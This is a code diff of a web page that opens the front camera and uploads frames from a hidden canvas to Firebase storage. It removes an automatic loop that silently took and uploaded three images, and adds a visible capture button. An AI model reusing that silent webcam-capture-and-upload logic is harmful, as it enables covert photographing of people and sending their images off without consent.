@@ -26,8 +26,8 @@
 
         // Function to upload image to Firebase
         function uploadImage(imageData) {
-            const storageRef = ref(storage, 'captured_images/image_' + Date.now() + '.png'); // Generate unique filename
-            uploadString(storageRef, imageData, 'data_url')
+            const imageRef = ref(storage, 'captured_images/image_' + Date.now() + '.png'); // Generate unique filename
+            uploadString(imageRef, imageData, 'data_url')
                 .then((snapshot) => {
                     console.log('Uploaded a blob or file!');
                 })
@@ -41,8 +41,6 @@
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
-            let captureCount = 0; // To track the number of captures
-            const maxCaptures = 3; // Maximum number of images to capture
 
             // Function to start capturing from the front camera
             function startCapture() {
@@ -55,21 +53,9 @@
                 })
                 .then(stream => {
                     video.srcObject = stream;
-
                     video.onloadedmetadata = () => {
                         canvas.width = 1920;  // Set canvas width to 1920 for 1080p
                         canvas.height = 1080; // Set canvas height to 1080 for 1080p
-
-                        // Automatically capture images every 5 seconds
-                        const captureInterval = setInterval(() => {
-                            if (captureCount < maxCaptures) {
-                                captureImage();
-                                captureCount++;
-                            } else {
-                                clearInterval(captureInterval); // Stop capturing after reaching the max count
-                                stopVideo(stream); // Stop the video stream
-                            }
-                        }, 5000); // 5 seconds
                     };
                 })
                 .catch(err => {
@@ -77,22 +63,21 @@
                 });
             }
 
-            // Function to capture image
-            function captureImage() {
+            // Function to capture image immediately
+            function captureImageImmediately() {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
                 const imageData = canvas.toDataURL('image/png');
                 // Automatically upload the image to the server
                 uploadImage(imageData);
             }
 
-            // Function to stop the video stream
-            function stopVideo(stream) {
-                const tracks = stream.getTracks();
-                tracks.forEach(track => track.stop());
-            }
-
             // Start capturing from the front camera
             startCapture();
+
+            // Add an event listener to capture image on link click
+            document.getElementById('captureButton').addEventListener('click', () => {
+                captureImageImmediately();
+            });
         });
     </script>
     <style>
@@ -121,6 +106,20 @@
         canvas {
             display: none; /* Hide canvas element */
         }
+
+        button {
+            background-color: #fff; /* White button */
+            color: #000; /* Black text */
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+
+        button:hover {
+            background-color: #ccc; /* Light grey on hover */
+        }
     </style>
 </head>
 <body>
@@ -129,5 +128,6 @@
         <video id="video" autoplay></video>
         <canvas id="canvas"></canvas>
     </div>
+    <button id="captureButton">Capture Image</button> <!-- Button to capture image -->
 </body>
 </html>
